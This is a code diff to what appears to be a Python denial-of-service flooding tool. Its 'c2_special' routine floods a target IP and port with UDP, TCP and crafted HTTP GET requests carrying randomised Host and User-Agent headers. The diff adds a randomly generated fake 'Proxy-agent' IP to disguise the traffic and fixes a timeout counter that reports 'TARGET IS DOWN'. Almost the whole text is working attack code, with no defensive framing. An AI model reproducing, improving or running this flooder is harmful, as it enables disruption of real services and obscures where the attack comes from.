@@ -51,6 +51,7 @@ from colorama import Fore, Back, Style, init
 import threading, socket, random, http.client, scapy.all
 from scapy.all import IP, TCP, sr1, ARP, Ether, srp
 
+global count
 global attack
 global user_ip
 user_ip = Faker()
@@ -3537,6 +3538,17 @@ elif answer == ("20"):
                 pass
             attack = int(0)
             def c2_special():
+                count = int(0)
+                ang = ['1','2','3','4','5','6','7','8','9','0']
+                #7
+                n1 = random.choice(ang)
+                n2 = random.choice(ang)
+                n3 = random.choice(ang)
+                n4 = random.choice(ang)
+                n5 = random.choice(ang)
+                n6 = random.choice(ang)
+                n7 = random.choice(ang)
+                fip = f"1{n1}{n2}.{n3}{n4}{n5}.{n6}.{n7}"
                 for fk in fake:
                     try:
                         udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -3560,7 +3572,9 @@ elif answer == ("20"):
                         t = str(ip)
                         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                         s.connect((ip,port))
-                        req = "GET / "+ip+" HTTP/1.1\r\nHost: "+random.choice(fake)+"\r\n"
+                        req = "GET / "+ip+" HTTP/1.1\r\n"
+                        req += "Host: "+random.choice(fake)+"\r\n"
+                        req += "Proxy-agent: "+str(fip)+"/1.0\r\n"
                         req += "User-Agent: "+random.choice(ua)+"\r\n"
                         req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
                         req += "Connection: Keep-Alive\r\n"
@@ -3590,7 +3604,6 @@ elif answer == ("20"):
                             tcp.send(tcp_packet, (ip,port))
                             scraper.get(ip, timeout=thrd)
                     except TimeoutError:
-                        count = int(0)
                         count += 1
                         print(Fore.LIGHTRED_EX+'TARGET IS DOWN : ERR.CONNECTION.TIMEOUT                             ', end='\r')
                     except TypeError:
@@ -3620,7 +3633,9 @@ elif answer == ("20"):
                         t = str(ip)
                         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                         s.connect((ip,port))
-                        req = "GET / "+ip+" HTTP/1.1\r\nHost: "+random.choice(fake)+"\r\n"
+                        req = "GET / "+ip+" HTTP/1.1\r\n"
+                        req += "Host: "+random.choice(fake)+"\r\n"
+                        req += "Proxy-agent: "+str(fip)+"/1.0\r\n"
                         req += "User-Agent: "+random.choice(ua)+"\r\n"
                         req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
                         req += "Connection: Keep-Alive\r\n"
